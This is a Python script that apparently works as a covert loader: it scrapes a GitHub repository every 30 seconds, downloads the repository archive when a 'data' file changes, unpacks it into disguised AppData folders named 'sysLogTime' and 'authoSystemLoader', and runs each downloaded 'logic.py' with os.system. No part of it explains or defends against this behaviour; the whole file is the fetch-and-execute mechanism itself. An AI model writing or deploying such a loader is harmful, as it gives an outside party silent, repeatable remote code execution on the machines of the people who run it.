import os
from asyncore import read
from itertools import count
from pkgutil import iter_modules
from bs4 import BeautifulSoup
import requests
import time
import zipfile



###########################################################
#                          CLASS                          #
###########################################################

class User():
    def __init__(self):
        self.name = os.environ.get( "USERNAME" )
        self.dir = f'C:\\Users\\{os.environ.get( "USERNAME" )}\\AppData\\Local\\sysLogTime'
        self.files = f'{self.dir}\\authoSystemLoader\\-mvfm2-main'

###########################################################
#                          MKOBJ                          #
###########################################################

user = User()

###########################################################
#                          CUIGH                          #
###########################################################

def check_now_date():
    a = 0
    while True:
        url = 'https://github.com/ma1v1n/-mvfm2'
        HEADERS = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.58'
        }

        response = requests.get(url, headers=HEADERS)
        soup = BeautifulSoup(response.content, 'html.parser')
        items_name = soup.find_all('a', class_='js-navigation-open Link--primary' )
        items_time_ago = soup.find_all('time-ago', class_='no-wrap')
        count = 0
        for item_name in items_name:
            if item_name.text == 'data':
                break
            count+=1

        with open('data.txt', 'w') as date:
            try:
                date.write(f'{items_time_ago[count].get("datetime")}')
                break
            except:
                pass
        a+=1
        

def new_file_has_load():
    a = 0
    while True:
        url = 'https://github.com/ma1v1n/-mvfm2'
        HEADERS = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.58'
        }

        response = requests.get(url, headers=HEADERS)
        soup = BeautifulSoup(response.content, 'html.parser')
        items_name = soup.find_all('a', class_='js-navigation-open Link--primary' )
        items_time_ago = soup.find_all('time-ago', class_='no-wrap')
        count = 0
        read = None

        for item_name in items_name:
            if item_name.text == 'data':
                break
            count+=1

        with open('data.txt', 'r') as date:
            read = date.read()
        

        try:
            if items_time_ago[count].get("datetime") != read:
                download_files('https://github.com/ma1v1n/-mvfm2/archive/refs/heads/main.zip')
                
            break
        except:
            pass

        a += 1

###########################################################
#                        DOWNLOADS                        #
###########################################################

def new_floader():
    try:
        os.mkdir(f'C:\\Users\\{os.environ.get( "USERNAME" )}\\AppData\\Local\\sysLogTime')
        return True
    except:
        return False

def get_zip():
    fantasy_zip = zipfile.ZipFile(f'{user.dir}\\download.zip')
    fantasy_zip.extractall(f'{user.dir}\\authoSystemLoader')
    
    fantasy_zip.close()
    os.remove(f'{user.dir}\\download.zip')

def get_git(url):
    local_filename = url.split('/')[-1]
    with requests.get(url, stream=True) as r:
        r.raise_for_status()

        new_user = new_floader()
        
        with open(f'{user.dir}\\download.zip', 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192): 
                f.write(chunk)
    return new_user


def download_files(url):
    get_git(url)
    get_zip()

###########################################################
#                       INSTALLING                        #
###########################################################

def install():

    dirs = os.listdir(f'{user.files}\\logs')

    for dir in dirs:
        os.system(f'{user.files}\\logs\\{dir}\\logic.py')

def start_files():
    os.system(f'{user.files}\\installer.py')


###########################################################
#                          MAIN                           #
###########################################################

def main():
    install()
    check_now_date()
    while True:
        new_file_has_load()
        time.sleep(30)

if __name__ == '__main__':
    main()

